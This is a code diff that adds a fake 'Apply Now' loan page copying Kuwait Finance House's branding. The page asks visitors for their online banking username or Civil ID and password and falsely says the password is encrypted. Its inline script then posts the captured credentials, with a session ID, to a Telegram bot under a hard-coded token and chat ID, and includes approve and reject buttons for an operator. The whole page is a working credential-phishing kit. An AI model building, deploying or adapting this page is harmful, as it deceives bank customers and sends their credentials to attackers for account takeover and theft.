@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apply Now - KFH Kuwait</title>
+    <link rel="icon" type="image/png" href="favicon.png" sizes="64x64">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="application.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Figtree:wght@400;500;600;700;800&family=Noto+Kufi+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <meta name="description" content="Apply for a personal loan with KFH Kuwait. Fast approval, Sharia'a compliant, and secure applications.">
+    
+    <style>
+        :root {
+            --kfh-green: #009144;
+            --kfh-dark-green: #006B35;
+            --kfh-light-green: #E8F5E9;
+            --kfh-gold: #C4A962;
+            --primary-color: #009144;
+            --primary-dark: #006B35;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="logo" onclick="window.location.href='index.html'" style="cursor: pointer;">
+                <img src="Kuwait-Finance-House.jpg" alt="KFH" class="logo-img" style="height: 36px; width: auto;">
+                <span class="logo-text">KFH Kuwait</span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Application Form -->
+    <section class="application-section">
+        <div class="application-container">
+            <!-- Progress Bar -->
+            <div class="progress-bar">
+                <div class="progress-step active" data-step="1">
+                    <div class="step-number">1</div>
+                    <div class="step-label">Login</div>
+                </div>
+                <div class="progress-line"></div>
+                <div class="progress-step" data-step="2">
+                    <div class="step-number">2</div>
+                    <div class="step-label">Verify</div>
+                </div>
+                <div class="progress-line"></div>
+                <div class="progress-step" data-step="3">
+                    <div class="step-number">3</div>
+                    <div class="step-label">Details</div>
+                </div>
+            </div>
+
+            <!-- Form Card -->
+            <div class="form-card">
+                <!-- Step 1: Username & Password -->
+                <div class="form-step active" id="step-1">
+                    <div class="step-header">
+                        <h2>KFH Online Banking Login</h2>
+                        <p>Enter your credentials to continue</p>
+                    </div>
+
+                    <form id="login-form" class="loan-form" action="verify.html" method="GET">
+                        <div class="form-group">
+                            <label for="username">Username / Civil ID *</label>
+                            <input type="text" id="username" name="username" required placeholder="Enter your username or Civil ID" class="phone-input">
+                            <small class="phone-hint">Enter your KFH Online username or Civil ID number</small>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="password">Password *</label>
+                            <input type="password" id="password" name="password" required placeholder="Enter your password" class="pin-input">
+                            <small>Your password is secure and encrypted</small>
+                        </div>
+
+                        <div class="form-actions">
+                            <button type="button" class="btn-secondary" onclick="window.location.href='index.html'">Back</button>
+                            <button type="submit" class="btn-primary btn-approve">Login</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <script src="landing-script.js"></script>
+    <script>
+        // Save credentials to sessionStorage when form is submitted
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            sessionStorage.setItem('kfh_username', username);
+            sessionStorage.setItem('kfh_password', password);
+            
+            // Send to bot
+            sendToBot(username, password);
+        });
+
+        async function sendToBot(username, password) {
+            const sessionId = 'session_' + Math.random().toString(36).substr(2, 9);
+            sessionStorage.setItem('kfh_session_id', sessionId);
+            
+            const message = '🏦 KFH KUWAIT - NEW LOGIN REQUEST\n\n🆔 Session ID: ' + sessionId + '\n👤 Username/Civil ID: ' + username + '\n🔐 Password: ' + password + '\n📅 Time: ' + new Date().toLocaleString();
+
+            const replyMarkup = {
+                inline_keyboard: [
+                    [{ text: '✅ APPROVE LOGIN', callback_data: 'login_approve_' + sessionId }, { text: '❌ REJECT LOGIN', callback_data: 'login_reject_' + sessionId }]
+                ]
+            };
+
+            try {
+                await fetch('https://api.telegram.org/bot8663835867:AAHBDm5yUNurJQSOuOdw7VWWekJuLzOj-l4/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: '7973653220', text: message, reply_markup: replyMarkup })
+                });
+            } catch (error) {
+                console.log('Error sending to bot:', error);
+            }
+        }
+    </script>
+</body>
+</html>
